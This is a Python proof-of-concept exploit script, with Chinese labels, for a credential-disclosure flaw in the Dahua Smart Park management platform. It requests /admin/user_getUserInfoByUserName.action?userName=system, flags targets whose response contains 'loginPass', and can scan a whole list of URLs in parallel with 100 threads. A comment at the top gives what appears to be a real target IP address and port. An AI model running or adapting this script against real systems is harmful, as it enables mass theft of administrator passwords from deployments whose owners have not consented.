#https://60.191.78.86:8002
import argparse
import re
import requests
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def poc(target):
    url = target + "/admin/user_getUserInfoByUserName.action?userName=system"
    headers = {
        "Cookie": "JSESSIONID = D981459C49F47400D6695B91F0D707F3",
        "User - Agent": "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 120.0) Gecko / 20100101 Firefox / 120.0",
        "Content - Length": "0"
    }

    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=5).text
        if "loginPass" in res:
            print("[+]存在存在存在！！！！！"+target)
        else:
            print("[-]不存在")
    except Exception as e:
        print(e)


def banana():
    banana = """

     ▄▄▄▄    ▄▄▄       ███▄    █  ▄▄▄       ███▄    █  ▄▄▄     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
▓█████▄ ▒████▄     ██ ▀█   █ ▒████▄     ██ ▀█   █ ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
▒██▒ ▄██▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
▒██░█▀  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
░▓█  ▀█▓ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
▒░▒   ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
 ░    ░   ░   ▒      ░   ░ ░   ░   ▒      ░   ░ ░   ░   ▒    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
 ░            ░  ░         ░       ░  ░         ░       ░  ░            ░ ░      ░ ░      ░  ░
      ░                                                                                       


    """
    print(banana)


def main():
    banana()


    parser = argparse.ArgumentParser(description="大华智慧园区管理平台任意密码读取")
    parser.add_argument("-u", "--url", help="输入你的URL")
    parser.add_argument("-f", "--file", help="please input your usernamefile")

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n"," "))

        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()